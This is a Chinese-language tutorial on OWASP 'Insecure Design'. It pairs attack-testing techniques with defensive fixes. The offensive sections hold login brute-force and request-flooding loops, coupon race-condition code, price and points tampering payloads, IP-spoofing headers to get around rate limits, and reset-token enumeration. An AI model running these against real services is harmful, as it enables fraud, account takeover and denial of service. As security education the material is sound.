# 🏗️ 不安全设计（A04: Insecure Design）全技巧

> **OWASP Top 10 2021 — 第4位**  
> 关注的是在设计阶段就存在的安全缺陷，而非实现上的bug。

---

## 📋 一、漏洞基础

### 1.1 什么是不安全设计？

不安全设计指的是应用程序在**架构设计阶段**就缺乏必要的安全控制措施，导致无论代码实现得多么规范，都无法从根本上解决安全问题。

> ⚠️ 与"安全配置错误"不同，不安全设计是**设计层面的固有缺陷**，不能通过补丁修复。

### 1.2 常见不安全设计模式

| 模式 | 说明 | 示例 |
|------|------|------|
| 🚫 **信任客户端** | 所有安全逻辑都在前端 | 前端控制按钮显示隐藏 |
| 🚫 **缺失速率限制** | API无频率限制 | 无限暴力破解 |
| 🚫 **缺失配额控制** | 用户可无限操作 | 无限API调用耗尽资源 |
| 🚫 **可预测资源ID** | 使用自增ID | IDOR漏洞 |
| 🚫 **单一故障点** | 全系统共享一个密钥 | 一个密钥泄露全部沦陷 |
| 🚫 **缺少纵深防御** | 仅靠单层防护 | WAF被绕过即完全失守 |

### 1.3 危害

- 系统架构级缺陷难以修复
- 安全补丁治标不治本
- 业务逻辑被绕过
- 资源被滥用/耗尽
- 合规与法律风险

---

## 🔍 二、基础检测技巧

### 2.1 设计缺陷识别

#### 信任客户端的表现
```javascript
// 🔴 不安全设计：前端控制权限
// 如果管理员面板在前端隐藏但后端不验证
if (user.role === 'admin') {
    document.getElementById('adminPanel').style.display = 'block';
}
// 攻击者可以直接访问 /admin/dashboard 而无需任何校验

// 🔴 不安全设计：前端验证
function validateForm() {
    if (price < 0) alert("价格不能为负！");
    // 但服务端未校验，攻击者可绕过
}
```

#### 缺少速率限制
```bash
# 测试登录接口是否有频率限制
for i in $(seq 1 1000); do
    curl -s -o /dev/null -w "%{http_code} " \
    -X POST https://target.com/api/login \
    -d "username=admin&password=test$i"
done
# 如果全部返回200，说明没有速率限制！
```

#### 配额控制缺失
```bash
# 测试API是否可无限调用
for i in $(seq 1 10000); do
    curl -s https://target.com/api/search?q=test &
done
wait
# 如果没有限流，可能导致服务不可用
```

### 2.2 业务逻辑缺陷

#### 流程绕过测试
```
正常流程: 注册 → 验证邮箱 → 登录 → 使用
测试:     注册 → 直接登录 (跳过邮箱验证)
          注册 → 使用API (跳过整个流程)
```

#### 负值/溢出测试
```json
// 电商业务逻辑测试
POST /api/cart/add
{"item_id": 1, "quantity": -1}        // 负值
{"item_id": 1, "quantity": 99999999}  // 溢出
{"item_id": 1, "price": -100}         // 负价格
{"item_id": 1, "price": 0}            // 零价格
```

---

## 🚀 三、进阶利用技巧

### 3.1 业务逻辑滥用

#### 优惠券/积分系统滥用

```python
import requests

# 场景1：并行请求-同一优惠券多次使用
def use_coupon(session):
    return session.post("https://target.com/api/coupon/apply",
                       json={"code": "NEW50OFF"})

sessions = [requests.Session() for _ in range(100)]
# 多个session同时使用同一个优惠券码
# 如果设计上先检查再使用（非原子操作），可重复使用

# 场景2：负值积分
POST /api/points/transfer
{"to_user": "attacker", "amount": -1000}
# 如果服务端不校验正负，可以实现积分盗取

# 场景3：积分循环兑换
# 积分 → 优惠券 → 变现 → 再买积分 → 循环
```

#### 价格篡改

```json
// 电商下单价格篡改
POST /api/order/create
{
  "items": [
    {"id": 1, "price": 1, "quantity": 1},    // 原价1000
    {"id": 2, "price": 0, "quantity": 999}   // 免费
  ]
}
// 设计缺陷：前端传输价格到后端
// 正确设计：后端从数据库取价格
```

### 3.2 速率限制绕过

```python
# 场景1：IP轮换绕过
proxies = [
    "http://proxy1:8080",
    "http://proxy2:8080",
    # ...
]

for proxy in proxies:
    requests.post("https://target.com/api/login",
                  data={"user": "admin", "pass": "test123"},
                  proxies={"http": proxy})

# 场景2：请求头扩展
# 某些WAF/限流器依赖特定header
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1

# 场景3：分布式爆破
# 使用多个AWS Lambda/CloudFunction同时发起请求
# 每个函数一个IP，绕过IP限流

# 场景4：慢速攻击
# 慢速发送请求，绕过基于速率的限制
# 每秒1个请求，持续24小时
```

### 3.3 密码恢复逻辑缺陷

```http
# 场景1：重置令牌可预测
GET /api/reset-password?token=1000  # 尝试
GET /api/reset-password?token=1001  # 尝试
# 如果是自增数字，可枚举

# 场景2：重置链接可篡改
# 正常: /reset?user=alice&token=abc123
# 篡改: /reset?user=bob&token=abc123
# 如果后端不验证token与user的绑定关系

# 场景3：步骤跳过
# 设计：验证邮箱 → 设置新密码 → 完成
# 绕过：直接访问 /api/reset-password/step3
```

### 3.4 多步骤流程绕过

```http
# 银行转账流程
# 设计：创建转账 → 确认 → 发送OTP → 验证OTP → 完成

# 绕过1：跳过确认步骤
POST /api/transfer/confirm
直接返回{"status": "confirmed"}

# 绕过2：跳过OTP验证
POST /api/transfer/execute
直接执行转账

# 绕过3：重放确认请求
# 多次发送确认请求，资金多次转移
```

### 3.5 状态管理缺陷

```json
// 场景：投票系统的设计缺陷

// 正常投票
POST /api/vote
{"item_id": 1, "voter_id": 1001}

// 绕过方式：
// 1. 修改voter_id
// 2. 删除voter_id字段
// 3. 将voter_id改为数组/对象
// 4. 并发投票（条件竞争）
```

### 3.6 搜索/分页数据泄露

```http
# API不分页或分页无限制导致数据泄露

# 正常请求
GET /api/users?page=1&limit=20

# 修改limit
GET /api/users?page=1&limit=1000000
# 如果设计上无最大限制，可一次性获取全部用户数据

# 遍历page
GET /api/users?page=9999&limit=1
# 如果总的用户数为0但仍返回数据，可能存在数据伪造
```

---

## 🛡️ 四、防御方案

### 4.1 安全设计原则

| 原则 | 说明 | 实现方式 |
|------|------|----------|
| 🔒 **默认安全** | 默认配置是安全的 | 拒绝所有，按需开放 |
| 🔒 **纵深防御** | 多层安全防护 | WAF + 应用层 + 数据库层 |
| 🔒 **最小权限** | 最小必要的权限 | RBAC + ABAC |
| 🔒 **永不信任** | 所有输入都需要验证 | 服务端校验所有数据 |
| 🔒 **安全默认值** | 默认禁用/拒绝 | 白名单机制 |

### 4.2 设计审查清单

- [ ] 是否使用威胁建模（STRIDE/PASTA）？
- [ ] 是否遵循安全设计模式？
- [ ] API是否强制鉴权和频率限制？
- [ ] 敏感操作是否需要二次确认？
- [ ] 关键业务是否有审计日志？
- [ ] 是否考虑了并发竞争条件？
- [ ] 是否有配额管理机制？
- [ ] 是否有资源隔离机制？

### 4.3 代码层面的设计修复

```python
# Flask限流设计（速率限制）
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@app.route("/api/login", methods=["POST"])
@limiter.limit("5 per minute")  # 每分钟5次
def login():
    # 登录逻辑
    pass

# 原子操作设计（防条件竞争）
from django.db import transaction

@transaction.atomic
def use_coupon(user_id, coupon_code):
    """使用优惠券 - 原子操作"""
    coupon = Coupon.objects.select_for_update().get(code=coupon_code)
    if coupon.used:
        return False
    coupon.used = True
    coupon.user_id = user_id
    coupon.save()
    return True
```

### 4.4 威胁建模示例（STRIDE）

| 威胁类型 | 说明 | 示例 | 缓解措施 |
|---------|------|------|----------|
| Spoofing | 冒充身份 | 伪造JWT | 强签名+短有效期 |
| Tampering | 篡改数据 | 修改价格 | 服务端校验+签名 |
| Repudiation | 否认操作 | 否认下单 | 完整审计日志 |
| Information Disclosure | 信息泄露 | API泄露PII | 最小化响应数据 |
| Denial of Service | 拒绝服务 | 无限请求 | 速率限制+配额 |
| Elevation of Privilege | 权限提升 | 越权操作 | RBAC+权限验证 |

---

## 🎯 五、实战测试方法论

### 5.1 业务逻辑测试流程

```
1. 理解业务 → 画流程图
2. 找设计假设 → "系统认为用户会..."
3. 打破假设 → 试反逻辑
4. 边界测试 → 0、负数、超大值
5. 并发测试 → 多线程同时操作
6. 状态跳转 → 跳过/回退步骤
```

### 5.2 常见突破点

| 功能模块 | 测试思路 |
|---------|---------|
| 注册/登录 | 跳过验证、重复注册、枚举 |
| 支付/订单 | 负价、零价、并发下单、重复付款 |
| 优惠券/积分 | 重复使用、负数、循环套利 |
| 密码重置 | token枚举、链接篡改、跳过步骤 |
| API接口 | 无鉴权、无限分页、批量操作 |
| 文件上传 | 覆盖文件、目录穿越、无大小限制 |

### 5.3 推荐工具

| 工具 | 用途 |
|------|------|
| Burp Suite Repeater | 手动修改请求测试业务逻辑 |
| Postman/Insomnia | API流程自动化测试 |
| OWASP Threat Dragon | 威胁建模 |
| pytm | Python威胁建模框架 |

---

> **💡 核心原则**：安全不能事后补救，必须在设计阶段就融入！信任但验证（Trust but Verify）是最大的安全陷阱，应该改为**永不信任，始终验证**（Never Trust, Always Verify）。
